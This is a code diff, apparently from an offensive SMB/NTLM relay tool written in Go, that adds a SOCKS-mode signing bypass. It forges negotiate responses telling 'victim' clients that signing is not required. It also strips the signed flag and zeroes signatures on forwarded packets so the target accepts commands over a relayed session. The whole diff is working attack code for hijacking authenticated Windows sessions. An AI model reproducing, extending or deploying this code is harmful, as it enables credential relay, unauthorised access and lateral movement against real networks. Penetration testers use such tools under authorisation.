@@ -281,7 +281,7 @@ func injectSession(client net.Conn, sess *RelaySession) {
 
 	// SMB1 multi-protocol NEGOTIATE → send SMB2 upgrade
 	if isSMB1(first) {
-		if err := sendNB(client, buildNegotiateResp(0)); err != nil {
+		if err := sendNB(client, buildSocksNegotiateResp(0)); err != nil {
 			return
 		}
 		first, err = recvNB(client)
@@ -298,7 +298,7 @@ func injectSession(client net.Conn, sess *RelaySession) {
 	// SMB2 NEGOTIATE → respond with capabilities, read next
 	if cmd == 0x0000 {
 		negMsgID := binary.LittleEndian.Uint64(first[24:32])
-		if err := sendNB(client, buildNegotiateResp(negMsgID)); err != nil {
+		if err := sendNB(client, buildSocksNegotiateResp(negMsgID)); err != nil {
 			return
 		}
 		first, err = recvNB(client)
@@ -376,6 +376,14 @@ func injectSession(client net.Conn, sess *RelaySession) {
 		// Rewrite MessageId and SessionId so the target accepts the packet.
 		binary.LittleEndian.PutUint64(req[24:32], targetMsgID)
 		binary.LittleEndian.PutUint64(req[40:48], sess.SessionID)
+		// Strip SMB2_FLAGS_SIGNED (0x8) and zero the Signature field.
+		// The client signs with its own local session key; the target would
+		// reject those signatures because the session was established via relay.
+		flags := binary.LittleEndian.Uint32(req[16:20])
+		if flags&0x00000008 != 0 {
+			binary.LittleEndian.PutUint32(req[16:20], flags&^uint32(0x00000008))
+			copy(req[48:64], make([]byte, 16))
+		}
 
 		sess.conn.conn.SetDeadline(time.Now().Add(30 * time.Second))
 		sendErr := sess.conn.send(req)
@@ -402,6 +410,19 @@ func injectSession(client net.Conn, sess *RelaySession) {
 }
 
 // ── response builders (victim-facing) ────────────────────────────────────────
+
+// buildSocksNegotiateResp is like buildNegotiateResp but forces SecurityMode=0x0001
+// (signing enabled, NOT required).  SOCKS clients must not sign — if they do,
+// their signatures are computed with a session key we don't have, and the target
+// will reject the forwarded packets with STATUS_INVALID_PARAMETER.
+func buildSocksNegotiateResp(msgID uint64) []byte {
+	resp := buildNegotiateResp(msgID)
+	// SecurityMode sits at bytes [64+2 : 64+4] (after StructureSize uint16).
+	if len(resp) >= 68 {
+		binary.LittleEndian.PutUint16(resp[66:68], 0x0001)
+	}
+	return resp
+}
 
 // buildSocksChallenge wraps spnego in a SESSION_SETUP MORE_PROCESSING response.
 func buildSocksChallenge(msgID uint64, spnego []byte) []byte {
